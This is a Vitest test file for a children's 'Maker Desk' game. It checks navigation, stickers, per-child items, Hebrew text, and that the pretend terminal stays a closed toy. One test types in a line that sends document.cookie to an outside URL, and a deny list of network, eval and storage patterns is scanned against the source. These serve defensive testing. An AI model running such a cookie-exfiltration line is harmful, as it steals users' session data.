/** Maker Desk through its real handlers, without a browser: the levels and
 * the way back, the three stickers and the finish, the child's own things,
 * and the pretend terminal as a closed toy. Layout, the canvas and real
 * audio are the rendered check (Playwright). */
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { isValidElement, type ReactElement } from 'react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
type Slot = { value?: any; deps?: readonly unknown[]; cleanup?: () => void };
const h = vi.hoisted(() => ({ cursor: 0, slots: [] as Slot[], lang: 'en', name: 'Noa', kept: [] as unknown[], creationsFor: [] as string[], keys: [] as ((e: any) => void)[],
  audio: { key: vi.fn(), tok: vi.fn(), chime: vi.fn(), boop: vi.fn(), power: vi.fn(), beep: vi.fn(), hm: vi.fn(), fanfare: vi.fn(), hum: vi.fn(), stop: vi.fn(), dispose: vi.fn() } }));
vi.mock('react', async original => {
  const actual = await original<typeof import('react')>();
  return { ...actual,
    useState(initial: any) { const slot = h.slots[h.cursor++] ??= { value: typeof initial === 'function' ? initial() : initial }; return [slot.value, (next: any) => { slot.value = typeof next === 'function' ? next(slot.value) : next; }]; },
    useRef(initial: any) { return (h.slots[h.cursor++] ??= { value: { current: initial } }).value; },
    useEffect(effect: () => void | (() => void), deps: readonly unknown[]) {
      const index = h.cursor++, old = h.slots[index];
      if (old?.deps && old.deps.length === deps.length && old.deps.every((v, i) => Object.is(v, deps[i]))) return;
      old?.cleanup?.(); const slot = h.slots[index] = { deps } as Slot; slot.cleanup = effect() || undefined;
    },
  };
});
vi.mock('../../../../../../context/LanguageContext', () => ({ useLanguage: () => ({ uiLang: h.lang }) }));
vi.mock('../../../../../../context/ArborContext', () => ({ useArborOptional: () => ({ childProfile: { id: 'child-a', age: 7 } }) }));
vi.mock('../../../../../../lib/native', () => ({ selectionHaptic: async () => {} }));
vi.mock('../../../../game/GameShell', () => ({ GameShell: () => null, GameFinish: () => null }));
vi.mock('../../../../audio/kidAudio', () => ({ useKidReadAloudMuted: () => false, onKidHush: () => () => {}, kidAudioAllowed: () => false, kidAudioContext: () => null }));
vi.mock('../../../studioCopy', () => ({ studioCopy: (lang: string) => lang === 'he' ? { hello: 'היי', helloNoName: 'היי!' } : { hello: 'Hi', helloNoName: 'Hi there!' } }));
vi.mock('../../../studioCreations', () => ({ useStudioCreations: (childId: string) => { h.creationsFor.push(childId); return { items: h.kept, loaded: true, isCurrent: () => true }; } }));
vi.mock('../../../StudioCreationResult', () => ({ CreationPreview: () => null }));
vi.mock('../../../StudioMakerArt', () => ({ StudioMakerPreview: () => null, isMakerCreation: (c: { kind: string }) => ['bowl', 'textile', 'bottle'].includes(c.kind) }));
vi.mock('../../../useStudioHero', () => ({ useStudioHero: () => ({ name: h.name }) }));
vi.mock('./deskAudio', () => ({ createDeskAudio: () => h.audio }));
import MakerDesk from './MakerDesk';
import { DeskBounce } from './DeskBounce';
import { DeskTerminal } from './DeskTerminal';
import { GameFinish } from '../../../../game/GameShell';
import { HERO_NAME_FALLBACK } from '../../../../../../lib/heroNameFallback';
import { MAKER_DESK_COPY } from './makerDeskCopy';

type Props = { children?: unknown; onClick?: (e?: any) => void; [key: string]: any };
function nodes(node: unknown): ReactElement<Props>[] { if (Array.isArray(node)) return node.flatMap(nodes); if (!isValidElement<Props>(node)) return []; return [node, ...nodes(node.props.children)]; }
function words(node: unknown): string { if (typeof node === 'string') return node; if (Array.isArray(node)) return node.map(words).join(''); if (isValidElement<Props>(node)) return words(node.props.children); return ''; }
const render = () => { h.cursor = 0; return MakerDesk(); };
const find = (tree: unknown, test: (n: ReactElement<Props>) => boolean, what: string) => { const found = nodes(tree).find(test); expect(found, what).toBeDefined(); return found!; };
const spot = (tree: unknown, name: string) => find(tree, n => n.props['data-spot'] === name, `spot ${name}`);
const icon = (tree: unknown, program: string) => find(tree, n => n.props.className === 'md-icon' && n.props['data-program'] === program, `icon ${program}`);
const section = (tree: unknown) => find(tree, n => n.props['data-adventure'] === 'maker-desk', 'section');
const backTab = (tree: unknown) => find(tree, n => n.props.className === 'md-backtab', 'back tab');
const lit = (tree: unknown) => nodes(tree).filter(n => n.props.className === 'md-sticker' && n.props['data-lit'] === true).length;
const en = MAKER_DESK_COPY.en;
const escape = () => { for (const fn of h.keys) fn({ key: 'Escape' }); };

beforeEach(() => {
  h.slots = []; h.lang = 'en'; h.name = 'Noa'; h.kept = []; h.creationsFor = []; h.keys = [];
  Object.values(h.audio).forEach(fn => fn.mockClear());
  vi.useFakeTimers();
  vi.stubGlobal('window', { matchMedia: () => ({ matches: false }), addEventListener: (type: string, fn: any) => { if (type === 'keydown') h.keys.push(fn); }, removeEventListener: (_: string, fn: any) => { h.keys = h.keys.filter(k => k !== fn); } });
  vi.stubGlobal('document', { visibilityState: 'visible', addEventListener: vi.fn(), removeEventListener: vi.fn() });
});
afterEach(() => { vi.useRealTimers(); vi.unstubAllGlobals(); });

/** Room → desktop: tap the computer and let it warm up. */
function switchOn() { spot(render(), 'pc').props.onClick!(); vi.advanceTimersByTime(1100); const tree = render(); expect(section(tree).props['data-level']).toBe('desktop'); return tree; }

describe('Maker Desk', () => {
  it('the four room objects respond: lamp, window, shelf and computer', () => {
    let tree = render();
    expect(section(tree).props['data-level']).toBe('study');
    expect(nodes(tree).filter(n => n.type === 'button' && n.props['data-spot']).map(n => n.props['data-spot']).sort()).toEqual(['lamp', 'pc', 'shelf', 'window']);
    spot(tree, 'lamp').props.onClick!(); tree = render();
    expect(section(tree).props['data-light']).toBe('evening'); expect(spot(tree, 'lamp').props['aria-pressed']).toBe(true);
    spot(tree, 'window').props.onClick!(); tree = render(); expect(spot(tree, 'window').props['aria-pressed']).toBe(false);
    spot(tree, 'shelf').props.onClick!(); tree = render(); expect(spot(tree, 'shelf').props['aria-pressed']).toBe(true);
    expect(words(find(tree, n => n.props.role === 'status', 'status'))).toBe(en.shelfTag);
    spot(tree, 'pc').props.onClick!(); expect(h.audio.power).toHaveBeenCalledTimes(1);
    expect(section(render()).props['data-level']).toBe('study');
    vi.advanceTimersByTime(1100); expect(section(render()).props['data-level']).toBe('desktop');
  });
  it('every level steps back one clear step at a time, by the tab or by Escape', () => {
    let tree = switchOn();
    expect(backTab(tree).props['data-back-to']).toBe('study'); expect(words(backTab(tree))).toContain(en.toDesk);
    icon(tree, 'bounce').props.onClick!(); tree = render();
    expect(section(tree).props['data-program']).toBe('bounce'); expect(backTab(tree).props['data-back-to']).toBe('desktop');
    backTab(tree).props.onClick!(); expect(section(render()).props['data-level']).toBe('desktop');
    icon(render(), 'ask').props.onClick!(); escape(); expect(section(render()).props['data-level']).toBe('desktop');
    escape(); expect(section(render()).props['data-level']).toBe('study');
    escape(); expect(section(render()).props['data-level']).toBe('study');
  });
  it('three discoveries light the stickers; then a Done tab appears in the room and finishes', () => {
    let tree = switchOn(); expect(lit(tree)).toBe(0);
    icon(tree, 'bounce').props.onClick!(); tree = render();
    find(tree, n => n.type === DeskBounce, 'bounce').props.onAllLit(); expect(lit(render())).toBe(1);
    backTab(render()).props.onClick!(); icon(render(), 'things').props.onClick!(); expect(lit(render())).toBe(2);
    backTab(render()).props.onClick!(); icon(render(), 'ask').props.onClick!(); tree = render();
    const term = find(tree, n => n.type === DeskTerminal, 'ask');
    term.props.onCommand('help'); term.props.onCommand('help'); term.props.onCommand(null); expect(lit(render())).toBe(2);
    term.props.onCommand('ls'); expect(lit(render())).toBe(3);
    vi.advanceTimersByTime(300); expect(h.audio.fanfare).toHaveBeenCalledTimes(1);
    expect(nodes(render()).some(n => n.props['data-maker-desk-done'] === '')).toBe(false);
    escape(); escape(); tree = render();
    expect(nodes(tree).some(n => n.type === GameFinish)).toBe(false);
    find(tree, n => n.props['data-maker-desk-done'] === '', 'done tab').props.onClick!();
    const finish = find(render(), n => n.type === GameFinish, 'finish');
    expect(finish.props.creation).toBeUndefined(); expect(finish.props.title).toBe(en.finish);
  });
  it('shows only the current child’s things, on the shelf, in My Things and in the terminal', () => {
    h.kept = [{ id: 'bowl', creation: { kind: 'bowl', glaze: 'rose', pattern: 0, seams: [3, 2, 1, 0] } }, { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }];
    let tree = render();
    expect(h.creationsFor.every(id => id === 'child-a')).toBe(true);
    expect(nodes(tree).filter(n => n.props.className === 'md-shelf__place').map(n => n.props['data-kind'])).toEqual(['bowl', 'dance', 'empty', 'empty', 'empty', 'empty']);
    switchOn(); icon(render(), 'things').props.onClick!(); tree = render();
    expect(nodes(tree).filter(n => n.props.className === 'md-things__tile').map(n => n.props['data-thing'])).toEqual(['bowl', 'dance']);
    backTab(tree).props.onClick!(); icon(render(), 'ask').props.onClick!();
    const term = find(render(), n => n.type === DeskTerminal, 'ask');
    expect(term.props.things).toEqual(['bowl', 'dance']); expect(term.props.hello).toEqual({ word: 'Hi', noName: 'Hi there!', name: 'Noa' });
  });
  it('an empty desk shows a friendly empty My Things, and greets without a name by the Studio convention', () => {
    h.name = HERO_NAME_FALLBACK; switchOn(); icon(render(), 'things').props.onClick!();
    expect(words(find(render(), n => n.props.className === 'md-things md-things--empty', 'empty'))).toBe(en.thingsEmpty);
    backTab(render()).props.onClick!(); icon(render(), 'ask').props.onClick!();
    expect(find(render(), n => n.type === DeskTerminal, 'ask').props.hello.name).toBeNull();
  });
  it('carries every word in Hebrew', () => {
    const he = MAKER_DESK_COPY.he;
    const shape = (value: unknown): unknown => Array.isArray(value) ? value.map(shape) : value && typeof value === 'object' ? Object.fromEntries(Object.entries(value).map(([k, v]) => [k, shape(v)])) : typeof value;
    expect(shape(he)).toEqual(shape(en));
    for (const key of ['title', 'description', 'instruction'] as const) { expect(he[key]).toMatch(/[֐-׿]/); expect(he[key]).not.toMatch(/[A-Za-z]/); }
    h.lang = 'he'; const tree = render();
    expect(section(tree).props.dir).toBe('rtl'); expect(words(find(tree, n => n.props.className === 'md-cue', 'cue'))).toBe(he.roomCue);
  });
});

describe('Ask the computer: what is typed stays a toy', () => {
  const renderTerm = (onCommand = vi.fn()) => { h.cursor = 0; return DeskTerminal({ w: en, lang: 'en', things: ['bowl'], hello: { word: 'Hi', noName: 'Hi there!', name: null }, audio: h.audio as any, onCommand }); };
  const input = (tree: unknown) => find(tree, n => n.type === 'input', 'input');
  /** The lines on the pretend screen, as text. */
  const screen = (tree: unknown) => nodes(find(tree, n => n.props.role === 'log', 'log')).filter(n => n.props.line).map(n => JSON.stringify(n.props.line)).join('\n');
  it('runs the big command buttons and typed words through the fixed table only', () => {
    const onCommand = vi.fn();
    let tree = renderTerm(onCommand);
    expect(nodes(tree).filter(n => n.props['data-command']).map(n => n.props['data-command'])).toEqual(['help', 'ls', 'cat about.txt', 'hello', 'clear']);
    find(tree, n => n.props['data-command'] === 'cat about.txt', 'about').props.onClick!();
    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.about[0]); expect(onCommand).toHaveBeenLastCalledWith('cat about.txt');
    input(tree).props.onChange({ target: { value: 'fetch("https://example.com/?q=" + document.cookie)' } });
    input(renderTerm(onCommand)).props.onKeyDown({ key: 'Enter', preventDefault: vi.fn() });
    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.unknown); expect(onCommand).toHaveBeenLastCalledWith(null);
    expect(input(tree).props.value).toBe('');
    find(tree, n => n.props['data-command'] === 'clear', 'clear').props.onClick!();
    expect(screen(renderTerm(onCommand))).toBe('');
    // The typed words appear only as the echoed line on this component's own screen.
    expect(h.slots.some(slot => JSON.stringify(slot.value ?? '').includes('document.cookie'))).toBe(false);
  });
  it('Tab finishes a known word; with nothing to finish it lets focus move on', () => {
    let tree = renderTerm();
    input(tree).props.onChange({ target: { value: 'cat th' } }); tree = renderTerm();
    expect(nodes(tree).filter(n => n.props.className === 'md-chip').map(words)).toEqual(['cat things/bowl']);
    const tab = { key: 'Tab', shiftKey: false, preventDefault: vi.fn() };
    input(tree).props.onKeyDown(tab); expect(tab.preventDefault).toHaveBeenCalled(); expect(input(renderTerm()).props.value).toBe('cat things/bowl');
    input(renderTerm()).props.onChange({ target: { value: '' } });
    const free = { key: 'Tab', shiftKey: false, preventDefault: vi.fn() };
    input(renderTerm()).props.onKeyDown(free); expect(free.preventDefault).not.toHaveBeenCalled();
  });
  it('the input never keeps more than the toy reads', () => {
    const tree = renderTerm();
    expect(input(tree).props.maxLength).toBe(40); expect(input(tree).props.autoComplete).toBe('off'); expect(input(tree).props.spellCheck).toBe(false);
    input(tree).props.onChange({ target: { value: 'x'.repeat(200) } }); expect(input(renderTerm()).props.value).toHaveLength(40);
  });
});

describe('the Maker Desk source is a closed toy', () => {
  const here = path.dirname(fileURLToPath(import.meta.url));
  const files = readdirSync(here).filter(f => /\.(tsx?)$/.test(f) && !/\.test\.tsx?$/.test(f));
  const strip = (s: string) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');
  it('nothing evaluates, fetches, stores or sends what the child does', () => {
    expect(files).toContain('DeskTerminal.tsx'); expect(files).toContain('makerDeskRules.ts');
    const FORBIDDEN = [/\beval\s*\(/, /new\s+Function\b/, /\bFunction\s*\(/, /\bfetch\s*\(/, /XMLHttpRequest/, /WebSocket/, /EventSource/, /sendBeacon/, /localStorage/, /sessionStorage/, /indexedDB/, /document\.cookie/,
      /useChildCollection/, /\bimport\s*\(/, /dangerouslySetInnerHTML/, /innerHTML/, /postMessage/, /setTimeout\s*\(\s*['"`]/, /\.save\s*\(/, /\bkidSay\b/, /speakText/];
    for (const file of files) for (const pattern of FORBIDDEN) expect(pattern.test(strip(readFileSync(path.join(here, file), 'utf8'))), `${file}: ${pattern}`).toBe(false);
  });
  it('the rules module is pure: no React, no DOM, no clock', () => {
    const rules = strip(readFileSync(path.join(here, 'makerDeskRules.ts'), 'utf8'));
    for (const pattern of [/from 'react'/, /\bwindow\b/, /\bdocument\b/, /Date\.now|new Date/, /Math\.random/, /setTimeout|setInterval/]) expect(pattern.test(rules), String(pattern)).toBe(false);
  });
});
